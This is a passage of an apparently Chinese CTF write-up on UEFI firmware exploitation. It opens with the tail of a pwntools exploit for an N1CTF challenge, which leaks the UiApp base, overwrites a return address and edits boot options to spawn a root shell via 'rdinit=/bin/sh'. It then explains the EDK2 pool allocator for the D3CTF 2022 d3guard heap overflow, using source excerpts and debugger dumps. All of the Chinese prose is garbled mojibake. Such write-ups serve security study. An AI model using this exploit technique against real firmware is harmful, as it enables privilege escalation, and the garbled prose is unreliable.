class="string">b&quot;\x1b[24~&quot;</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">addSend(<span class="string">b&#x27;leak&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">256</span>)</span><br><span class="line">get(<span class="string">b&#x27;leak&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">256</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>)</span><br><span class="line">leak, i, j = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(data):</span><br><span class="line">    <span class="keyword">if</span> data[i] == <span class="built_in">ord</span>(<span class="string">b&quot;\\&quot;</span>):</span><br><span class="line">        n = <span class="built_in">int</span>(data[i+<span class="number">2</span>:i+<span class="number">4</span>], <span class="number">16</span>)</span><br><span class="line">        i += <span class="number">4</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        n = data[i]</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    leak += n * (<span class="number">0x100</span>**j)</span><br><span class="line">    j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">uiapp_base = leak - <span class="number">0x1e009c0</span></span><br><span class="line">boot = uiapp_base + <span class="number">0x235A</span></span><br><span class="line">lg(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;uiapp_base&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;boot&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p32(boot)</span><br><span class="line">add(<span class="string">b&quot;N1CTF_KEY1&quot;</span>, payload)</span><br><span class="line">add(<span class="string">b&quot;N1CTF_KEY2&quot;</span>, payload)</span><br><span class="line">add(<span class="string">b&quot;win&quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x11</span>)</span><br><span class="line"></span><br><span class="line">encode(<span class="string">b&#x27;win&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Standard PC&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>, <span class="number">3</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>, <span class="number">3</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;\rrootshell\r&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&quot;\rconsole=ttyS0 initrd=rootfs.img rdinit=/bin/sh quiet\r&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;up&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;esc&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line">send_key(<span class="string">b&quot;down&quot;</span>, <span class="number">3</span>)</span><br><span class="line">send_key(<span class="string">b&quot;enter&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹ï¼š  </p><img src="/2025/01/06/uefi2/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h2 id="Heap-OverFlow"><a href="#Heap-OverFlow" class="headerlink" title="Heap OverFlow"></a>Heap OverFlow</h2><p>è¿™é‡Œç”¨çš„ç¯å¢ƒæ˜¯ D3CTF 2022 d3guardï¼Œè¿™é“é¢˜ç›®å½“æ—¶æ˜¯ 0 è§£ï¼Œè€Œä¸”æ¶‰åŠåˆ°å¾ˆå¤šæ¯”è¾ƒå†·é—¨çš„çŸ¥è¯†ç‚¹ï¼Œç¬”è€…è§‰å¾—è¿™é¢˜å‡ºå¾—éå¸¸çš„ç¡¬æ ¸ï¼Œå­¦åˆ°äº†éå¸¸å¤šçš„ä¸œè¥¿Orz  </p><h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><p>å’Œä¸Šä¸€é“é¢˜ç›®ä¸€æ ·ï¼Œè¿è¡Œ run.py åè·å¾—çš„æ˜¯ä¸€ä¸ªä½æƒé™çš„ shellï¼Œéœ€è¦æˆ‘ä»¬ææƒåæ‰èƒ½å¤Ÿè·å– flagã€‚åœ¨å¯åŠ¨ qemu çš„æ—¶å€™æˆ‘ä»¬æŒ‰ f12 å°±èƒ½å¤Ÿè¿›å…¥åˆ°å‡ºé¢˜äººè‡ªå·±å®ç°çš„äº¤äº’ç•Œé¢ã€‚  </p><img src="/2025/01/06/uefi2/5.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ä¸éš¾æƒ³åˆ°æ¼æ´å°±å‡ºç°åœ¨è¿™ä¸ªåœ°æ–¹ï¼Œåœ¨ IDA ä¸­è¿›è¡Œå­—ç¬¦ä¸²çš„æœç´¢è€ƒç ”å¾ˆå¿«çš„å®šä½åˆ°è¿™éƒ¨åˆ†çš„åŠŸèƒ½ç”± UiApp ç»„ä»¶å®ç°ã€‚ç”±äºè¿™é“é¢˜æ¶‰åŠåˆ° UEFI çš„å †ç®¡ç†ç³»ç»Ÿï¼Œæ‰€ä»¥ä¸‹é¢å°±å…ˆç®€å•çš„ä»‹ç»ä¸€ä¸‹ UEFI çš„å †ã€‚</p><h3 id="å †å—çš„ç®¡ç†"><a href="#å †å—çš„ç®¡ç†" class="headerlink" title="å †å—çš„ç®¡ç†"></a>å †å—çš„ç®¡ç†</h3><p>å¦‚æœæƒ³çŸ¥é“è¯¦ç»†çš„è¿‡ç¨‹è¯·è¯»è€…è‡ªè¡Œå»çœ‹<a href="https://github.com/tianocore/edk2/blob/master/MdeModulePkg/Core/Dxe/Mem/Pool.c">æºç </a>ï¼Œè¿™é‡Œæˆ‘åªç®€å•çš„æ€»ç»“ä¸€ä¸‹åˆ†é…çš„å †å—æ²¡æœ‰å¾ˆå¤§çš„æƒ…å†µï¼Œè€Œä¸”å¿½ç•¥äº†å¾ˆå¤šç»†èŠ‚ï¼ˆæ¯”å¦‚å †å—åˆå¹¶ï¼‰ã€‚  </p><p>åœ¨ UEFI ä¸­å­˜åœ¨ä¸€ä¸ª mPoolHead æ•°ç»„ç”¨äºå­˜å‚¨ POOL ç»“æ„ä½“ï¼Œè¯¥æ•°ç»„çš„æ¯ä¸€ä¸ªç´¢å¼•å¯¹åº”ç€ä¸åŒ EfiMemoryType ç±»å‹çš„ POOLï¼Œç›¸å…³ä»£ç å¦‚ä¸‹ï¼š  </p><p><strong>POOL</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  INTN               Signature;</span><br><span class="line">  UINTN              Used;</span><br><span class="line">  EFI_MEMORY_TYPE    MemoryType;</span><br><span class="line">  LIST_ENTRY         FreeList[MAX_POOL_LIST];</span><br><span class="line">  LIST_ENTRY         Link;</span><br><span class="line">&#125; POOL;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Pool header for each memory type.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">POOL  mPoolHead[EfiMaxMemoryType];</span><br><span class="line"></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// LIST_ENTRY structure definition.</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">LIST_ENTRY</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// _LIST_ENTRY structure definition.</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> &#123;</span></span><br><span class="line">  LIST_ENTRY    *ForwardLink;</span><br><span class="line">  LIST_ENTRY    *BackLink;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>EfiMemoryType</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// Enumeration of memory types introduced in UEFI.</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Not used.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiReservedMemoryType,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// The code portions of a loaded application.</span></span><br><span class="line">  <span class="comment">/// (Note that UEFI OS loaders are UEFI applications.)</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiLoaderCode,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// The data portions of a loaded application and the default data allocation</span></span><br><span class="line">  <span class="comment">/// type used by an application to allocate pool memory.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiLoaderData,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// The code portions of a loaded Boot Services Driver.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiBootServicesCode,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// The data portions of a loaded Boot Serves Driver, and the default data</span></span><br><span class="line">  <span class="comment">/// allocation type used by a Boot Services Driver to allocate pool memory.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiBootServicesData,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// The code portions of a loaded Runtime Services Driver.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiRuntimeServicesCode,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// The data portions of a loaded Runtime Services Driver and the default</span></span><br><span class="line">  <span class="comment">/// data allocation type used by a Runtime Services Driver to allocate pool memory.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiRuntimeServicesData,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Free (unallocated) memory.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiConventionalMemory,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Memory in which errors have been detected.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiUnusableMemory,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Memory that holds the ACPI tables.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiACPIReclaimMemory,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Address space reserved for use by the firmware.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiACPIMemoryNVS,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Used by system firmware to request that a memory-mapped IO region</span></span><br><span class="line">  <span class="comment">/// be mapped by the OS to a virtual address so it can be accessed by EFI runtime services.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiMemoryMappedIO,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// System memory-mapped IO region that is used to translate memory</span></span><br><span class="line">  <span class="comment">/// cycles to IO cycles by the processor.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiMemoryMappedIOPortSpace,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// Address space reserved by the firmware for code that is part of the processor.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiPalCode,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// A memory region that operates as EfiConventionalMemory,</span></span><br><span class="line">  <span class="comment">/// however it happens to also support byte-addressable non-volatility.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiPersistentMemory,</span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  <span class="comment">/// A memory region that describes system memory that has not been accepted</span></span><br><span class="line">  <span class="comment">/// by a corresponding call to the underlying isolation architecture.</span></span><br><span class="line">  <span class="comment">///</span></span><br><span class="line">  EfiUnacceptedMemoryType,</span><br><span class="line">  EfiMaxMemoryType,</span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// +---------------------------------------------------+</span></span><br><span class="line">  <span class="comment">// | 0..(EfiMaxMemoryType - 1)    - Normal memory type |</span></span><br><span class="line">  <span class="comment">// +---------------------------------------------------+</span></span><br><span class="line">  <span class="comment">// | EfiMaxMemoryType..0x6FFFFFFF - Invalid            |</span></span><br><span class="line">  <span class="comment">// +---------------------------------------------------+</span></span><br><span class="line">  <span class="comment">// | 0x70000000..0x7FFFFFFF       - OEM reserved       |</span></span><br><span class="line">  <span class="comment">// +---------------------------------------------------+</span></span><br><span class="line">  <span class="comment">// | 0x80000000..0xFFFFFFFF       - OS reserved        |</span></span><br><span class="line">  <span class="comment">// +---------------------------------------------------+</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  MEMORY_TYPE_OEM_RESERVED_MIN = <span class="number">0x70000000</span>,</span><br><span class="line">  MEMORY_TYPE_OEM_RESERVED_MAX = <span class="number">0x7FFFFFFF</span>,</span><br><span class="line">  MEMORY_TYPE_OS_RESERVED_MIN  = <span class="number">0x80000000</span>,</span><br><span class="line">  MEMORY_TYPE_OS_RESERVED_MAX  = <span class="number">0xFFFFFFFF</span></span><br><span class="line">&#125; EFI_MEMORY_TYPE;</span><br></pre></td></tr></table></figure><p>åœ¨æ¯ä¸ª POOL ç»“æ„ä½“ä¸­æœ‰ä¸€ä¸ª FreeList æ•°ç»„ç”¨äºå­˜å‚¨è¢«é‡Šæ”¾çš„å †å—åŒå‘é“¾è¡¨ï¼Œç±»ä¼¼äº ptmalloc ä¸­ unosrtedbin &#x2F; smallbin &#x2F; largebinï¼Œä¸è¿‡éµå¾ªåè¿›å…ˆå‡ºã€‚å½“æŸä¸ª FreeList ä¸ºç©ºæ—¶ ForwardLink å’Œ BackLink æŒ‡å‘è¯¥ FreeList è‡ªèº«ï¼ŒFreeList çš„åˆå§‹åŒ–ä»£ç å¦‚ä¸‹ï¼š    </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  Called to initialize the pool.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line">VOID</span><br><span class="line"><span class="title function_">CoreInitializePool</span> <span class="params">(</span></span><br><span class="line"><span class="params">  VOID</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line">&#123;</span><br><span class="line">  UINTN  Type;</span><br><span class="line">  UINTN  Index;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (Type = <span class="number">0</span>; Type &lt; EfiMaxMemoryType; Type++) &#123;</span><br><span class="line">    mPoolHead[Type].Signature  = <span class="number">0</span>;</span><br><span class="line">    mPoolHead[Type].Used       = <span class="number">0</span>;</span><br><span class="line">    mPoolHead[Type].MemoryType = (EFI_MEMORY_TYPE)Type;</span><br><span class="line">    <span class="keyword">for</span> (Index = <span class="number">0</span>; Index &lt; MAX_POOL_LIST; Index++) &#123;</span><br><span class="line">      InitializeListHead (&amp;mPoolHead[Type].FreeList[Index]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  Initializes the head node of a doubly-linked list, and returns the pointer to</span></span><br><span class="line"><span class="comment">  the head node of the doubly-linked list.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Initializes the forward and backward links of a new linked list. After</span></span><br><span class="line"><span class="comment">  initializing a linked list with this function, the other linked list</span></span><br><span class="line"><span class="comment">  functions may be used to add and remove nodes from the linked list. It is up</span></span><br><span class="line"><span class="comment">  to the caller of this function to allocate the memory for ListHead.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  If ListHead is NULL, then ASSERT().</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @param  ListHead  A pointer to the head node of a new doubly-linked list.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  @return ListHead</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line">LIST_ENTRY *</span><br><span class="line">EFIAPI</span><br><span class="line"><span class="title function_">InitializeListHead</span> <span class="params">(</span></span><br><span class="line"><span class="params">  IN OUT  LIST_ENTRY  *ListHead</span></span><br><span class="line"><span class="params">  )</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  ASSERT (ListHead != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  ListHead-&gt;ForwardLink = ListHead;</span><br><span class="line">  ListHead-&gt;BackLink    = ListHead;</span><br><span class="line">  <span class="keyword">return</span> ListHead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>FreeList çš„æ¯ä¸ªä¸‹æ ‡å¯¹åº”ç€ä¸åŒçš„ size  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Each element is the sum of the 2 previous ones: this allows us to migrate</span></span><br><span class="line"><span class="comment">// blocks between bins by splitting them up, while not wasting too much memory</span></span><br><span class="line"><span class="comment">// as we would in a strict power-of-2 sequence</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">STATIC CONST UINT16  mPoolSizeTable[] = &#123;</span><br><span class="line">  <span class="number">128</span>, <span class="number">256</span>, <span class="number">384</span>, <span class="number">640</span>, <span class="number">1024</span>, <span class="number">1664</span>, <span class="number">2688</span>, <span class="number">4352</span>, <span class="number">7040</span>, <span class="number">11392</span>, <span class="number">18432</span>, <span class="number">29824</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ€»çš„æ¥è¯´å †ç®¡ç†å™¨çš„ç»“æ„å¦‚ä¸‹ï¼š  </p><img src="/2025/01/06/uefi2/4.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>ç”³è¯·å‡ºæ¥çš„å †å—ä¼šç»™åŠ ä¸Šå †å—å¤´ POOL_HEAD å’Œå †å—å°¾ POOL_TAILï¼Œè€Œå †å—è¢«é‡Šæ”¾åå †å—å°¾ä¼šç»™å¼ƒç”¨ï¼Œå †å—å¤´ä¼šç»™ä¿®æ”¹ä¸º POOL_FREE</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  UINT32        Signature;</span><br><span class="line">  UINT32        Index;</span><br><span class="line">  LIST_ENTRY    Link;</span><br><span class="line">&#125; POOL_FREE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  UINT32             Signature;</span><br><span class="line">  UINT32             Reserved;</span><br><span class="line">  EFI_MEMORY_TYPE    Type;</span><br><span class="line">  UINTN              Size;</span><br><span class="line">  CHAR8              Data[<span class="number">1</span>];</span><br><span class="line">&#125; POOL_HEAD;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  UINT32    Signature;</span><br><span class="line">  UINT32    Reserved;</span><br><span class="line">  UINTN     Size;</span><br><span class="line">&#125; POOL_TAIL;</span><br></pre></td></tr></table></figure><p>æ¯å½“æˆ‘ä»¬ç”¨ gBS-&gt;AllocatePool(type, BufferSize, Buffer) ç”³è¯·ä¸€ä¸ªå †å—æ—¶ï¼Œä¼šé¦–å…ˆå°† BufferSize è¿›è¡Œå…«å­—èŠ‚å¯¹é½ï¼Œç„¶ååŠ ä¸Šå †å—å¤´å’Œå †å—å°¾çš„å¤§å°ã€‚ç„¶åæ ¹æ® type æ‰¾åˆ°å¯¹åº”çš„ POOLï¼Œç„¶åå†æ ¹æ®æ›´æ–°åçš„ size æ‰¾åˆ°å¯¹åº”çš„ FreeListã€‚å¦‚æœè¯¥ FreeList ä¸ä¸ºç©ºå°±ç›´æ¥ä»ä¸Šé¢è·å–å †å—å¹¶è®¾ç½® POOL_HEAD å’Œ POOL_TAILã€‚å¦‚æœ FreeList ä¸ºç©ºï¼Œåˆ™ä»å †ç©ºé—´å¼€è¾Ÿæ–°çš„å †å—ã€‚<br>è°ƒç”¨ gBS-&gt;FreePool çš„æ“ä½œåˆ™ä¸ä¹‹ç›¸åï¼ŒåŒæ ·æ˜¯å…ˆåŒè¿‡ type å’Œ size æ‰¾åˆ°å¯¹åº”çš„ POOL çš„ FreeListï¼Œç„¶åå°† POOL_HEAD ä¿®æ”¹ä¸º POOL_FREE å¹¶å°†å…¶é“¾å…¥ FreeList ä¸­ï¼Œè¿™ä¸­é—´è¿˜æœ‰å¾ˆå¤šçš„ç»†èŠ‚ï¼Œè™½ç„¶åœ¨è¿™é“é¢˜ç›®ä¸­ç”¨ä¸ä¸Šï¼Œä¸è¿‡å¦‚æœä»”ç»†ç ”ç©¶çš„è¯ä¹Ÿè®¸æˆ‘ä»¬å°±èƒ½å¤Ÿåœ¨ååˆ†è‹›åˆ»çš„æ¡ä»¶ä¸‹æ„é€ å¾ˆæè‡´çš„å †é£æ°´æ¥å®ç°æ¼æ´çš„åˆ©ç”¨ï¼ˆç­‰æˆ‘è€ƒå®Œç ”åçœ‹çœ‹èƒ½ä¸èƒ½å‡ºåœ¨ WMCTF ä¸ŠğŸ˜šğŸ˜šğŸ˜šï¼‰  </p><p>æˆ‘åˆ©ç”¨çš„é¢˜ç›®çš„ç¨‹åºç”³è¯·äº† name å’Œ descï¼Œname ä¸º 0x10 ä¸ª aï¼Œdesc ä¸º 0x20 ä¸ª bï¼Œå†…å­˜å¸ƒå±€å¦‚ä¸‹ï¼š  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0x2b552f00</span><br><span class="line">0x2b552f00:     0x0000000130646870      0x0000000000000000  &lt;---- name (using)</span><br><span class="line">0x2b552f10:     0x0000000000000040      0x6161616161616161  </span><br><span class="line">0x2b552f20:     0x6161616161616161      0xafafafafafafaf00</span><br><span class="line">0x2b552f30:     0xafafafaf6c617470      0x0000000000000040</span><br><span class="line">0x2b552f40:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f50:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f60:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f70:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f80:     0x0000000030646870      0x0000000000000000  &lt;---- desc (using)</span><br><span class="line">0x2b552f90:     0x0000000000000060      0x6262626262626262</span><br><span class="line">0x2b552fa0:     0x6262626262626262      0x6262626262626262</span><br><span class="line">0x2b552fb0:     0x6262626262626262      0xafafafafafafaf00</span><br><span class="line">0x2b552fc0:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552fd0:     0xafafafaf6c617470      0x0000000000000060</span><br></pre></td></tr></table></figure><p>å†å°†è¿™ä¸ªä¸¤ä¸ªå †å—é‡Šæ”¾åçš„å†…å­˜ç©ºé—´å¦‚ä¸‹ï¼š  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0x2b552f00</span><br><span class="line">0x2b552f00:     0x0000000030726670      0x000000002b8c9e18  &lt;---- name (freed)</span><br><span class="line">0x2b552f10:     0x000000002b552f88      0xafafafafafafafaf</span><br><span class="line">0x2b552f20:     0xafafafafafafafaf      0xafafafafafafafaf</span><br><span class="line">0x2b552f30:     